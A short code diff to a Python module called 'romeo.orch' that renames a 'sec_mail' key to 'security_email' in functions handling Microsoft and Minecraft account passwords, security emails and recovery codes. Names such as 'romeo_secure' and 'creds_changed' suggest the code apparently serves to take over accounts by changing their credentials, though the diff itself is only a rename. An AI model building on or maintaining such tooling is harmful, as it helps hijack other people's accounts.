@@ -27,7 +27,7 @@ rom = logging.getLogger("romeo.orch")
 async def _reject(email: str, why: str, record: dict, *, creds_changed: bool) -> dict:
     ms = (record.get("microsoft") or {}).copy()
     mc = (record.get("minecraft") or {}).copy()
-    sec = str(ms.get("sec_mail") or "").strip()
+    sec = str(ms.get("security_email") or "").strip()
     pwd = str(ms.get("password") or "").strip()
     rec = str(ms.get("rec_code") or "").strip()
     origin = str(ms.get("orig_email") or email or "").strip() or email
@@ -146,7 +146,7 @@ async def romeo_secure(sesja: httpx.AsyncClient, email, device=None,
 
     if rextra:
         account["microsoft"]["password"] = rextra.get("password")
-        account["microsoft"]["sec_mail"] = rextra.get("sec_mail")
+        account["microsoft"]["security_email"] = rextra.get("security_email")
         account["microsoft"]["rec_code"] = rextra.get("rec_code")
 
     if embed_chk and msaauth == "Family":
@@ -269,7 +269,7 @@ async def romeo_secure(sesja: httpx.AsyncClient, email, device=None,
             email=ms.get("email", ""),
             recovery=ms.get("rec_code", ""),
             password=ms.get("password", ""),
-            sec_mail=ms.get("sec_mail", ""),
+            sec_mail=ms.get("security_email", ""),
             username=account["minecraft"].get("name", ""),
         )
         return {
